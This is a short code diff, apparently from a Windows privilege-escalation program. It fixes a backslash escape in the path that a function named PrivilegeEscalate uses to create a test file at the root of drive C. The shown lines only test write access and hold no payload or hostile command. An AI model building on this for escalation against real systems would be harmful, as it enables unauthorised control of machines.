@@ -9,7 +9,7 @@ char TemporaryPath[MAX_PATH + sizeof(INSTALLER_NAME) + 1] = { 0 };
 DWORD PrivilegeEscalate() {
     char StringOfPID[10] = { 0 };
     DWORD BytesWritten = 0;
-    HANDLE TestFile = CreateFileA("C:\testfile.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE TestFile = CreateFileA("C:\\testfile.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (TestFile == INVALID_HANDLE_VALUE) {
         return GetLastError();
     }
